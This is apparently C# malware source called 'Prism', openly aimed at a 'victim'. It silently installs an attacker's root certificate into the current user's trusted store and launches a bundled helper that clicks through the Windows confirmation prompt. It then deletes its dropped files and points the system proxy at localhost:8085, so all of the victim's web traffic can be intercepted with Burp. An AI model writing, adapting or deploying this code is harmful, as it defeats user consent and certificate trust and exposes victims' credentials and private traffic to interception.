//Coded By 0xyg3n and Tehtafara0 with love <3 
//Use it Wisely.
//You can use Burp to generate the CA , import it to the code and then use the proxy with port forward.
//After that you will be able to capture everything the victim is requesting.

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Threading;


namespace Prism
{
    static class Program
    {
        static void Main()
        {
            try
            {
                //Define file paths
                string cert = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\prism.der";
                string bypassdlg = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\bypassdlg.exe";
                //Extract files
                File.WriteAllBytes(cert, Properties.Resources.cert);
                File.WriteAllBytes(bypassdlg, Properties.Resources.bypassdlg);
                //Install certificate
                X509Store store = new X509Store(StoreName.Root, StoreLocation.CurrentUser); //Store the certificate in current user's root authority
                X509Certificate2 certificate = new X509Certificate2(cert); //Convert the certificate to a specific format so it will be easier to process
                store.Open(OpenFlags.ReadWrite); //Open the store for reading & writing
                new Thread(() =>
                { //Create a new thread in order to bypass the confirmation dialog
                    try
                    {
                        Thread.Sleep(2000); //Wait for the prompt to appear
                        Process p = new Process();
                        p.StartInfo.FileName = bypassdlg;
                        p.StartInfo.Arguments = "dlg \" \" \" \" click yes";
                        p.Start(); //Bypass the prompt
                    } catch
                    {
                        Environment.Exit(0);
                    }
                }).Start();
                store.Add(certificate); //Add the certificate to the opened store (this is where the dialog prompts the user)
                store.Close(); //Close the opened certificate store
                File.Delete(cert); //Delete the certificate
                File.Delete(bypassdlg); //Delete the bypass executable
                RegistryKey reg_key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", true); //Change this line if you want to install the Certificate for all users (it requires UAC Prompt)
                reg_key.SetValue("ProxyServer","localhost:8085"); //Set the system proxy settings
                reg_key.SetValue("ProxyEnable", 1);  //Enable the proxy
            } catch {
                Environment.Exit(0);
            }
        }
    }
}
